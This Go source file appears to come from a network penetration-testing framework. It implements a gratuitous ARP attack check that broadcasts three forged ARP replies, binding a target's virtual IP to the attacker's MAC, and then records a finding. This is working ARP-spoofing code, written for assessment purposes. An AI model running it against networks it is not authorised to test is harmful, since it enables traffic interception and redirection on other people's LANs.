// gratarp.go implements the gratuitous ARP attack behavior. It sends
// broadcast ARP replies announcing an IP→MAC mapping. Classified
// transient-decay: the neighbor cache ages out after the attack stops.

package fh

import (
	"context"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type gratARPFinding struct {
	Action string `json:"action"`
	IP     string `json:"ip"`
	Count  int    `json:"count"`
}

// RunGratARP sends gratuitous ARP replies announcing the attacker's MAC
// for the target's virtual IP, the address the attacker claims. The burst
// of three is probe content. The verdict is pending: whether a neighbor
// cache took the announcement needs a probe it does not have.
func RunGratARP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVirtualIP); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	ip := deps.Target.VirtualIP

	count := 3
	for i := range count {
		pkt, err := craftGratARP(src, ip)
		if err != nil {
			return check.Verdict{}, errs.Wrapf(err, "gratarp: craft frame %d", i)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return check.Verdict{}, errs.Wrapf(err, "gratarp: send frame %d", i)
		}
	}

	detail, _ := json.Marshal(gratARPFinding{
		Action: "gratuitous-arp",
		IP:     ip.String(),
		Count:  count,
	})
	deps.Emitter.Finding("arp", detail)

	return check.Pending("no observable: cache acceptance needs a probe of the announced address"), nil
}

// craftGratARP builds a gratuitous ARP reply: announcing ip is-at src.
func craftGratARP(src net.HardwareAddr, ip net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       broadcastMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   src,
		SourceProtAddress: ip,
		DstHwAddress:      broadcastMAC,
		DstProtAddress:    ip,
	}
	return craft.Default(eth, arp)
}
